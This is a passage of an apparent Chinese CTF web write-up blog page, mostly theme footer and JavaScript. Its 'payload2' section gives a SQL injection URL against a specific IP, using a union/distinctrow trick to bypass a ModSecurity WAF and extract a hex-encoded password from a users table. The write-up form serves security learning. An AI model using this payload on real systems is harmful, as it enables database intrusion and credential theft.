class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>利用这篇文章的payload<a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1727">https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1727</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.11.207:8099/sql.php?<span class="built_in">id</span>=@.:=right(right((select hex(password) from users.info limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1111</span>),<span class="number">1111</span>) union%<span class="number">23</span>%<span class="number">0</span>adistinctrow%<span class="number">0</span>bselect@.</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212142233229.png" alt="image-20221205192932575" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221205192932575</span></div></div>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/03/%E6%AF%94%E8%B5%9Bwp/2023vnctf/">2023VNCTF Web</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/03/%E6%AF%94%E8%B5%9Bwp/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/">黄河流域公安院校网络空间安全技能挑战赛</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
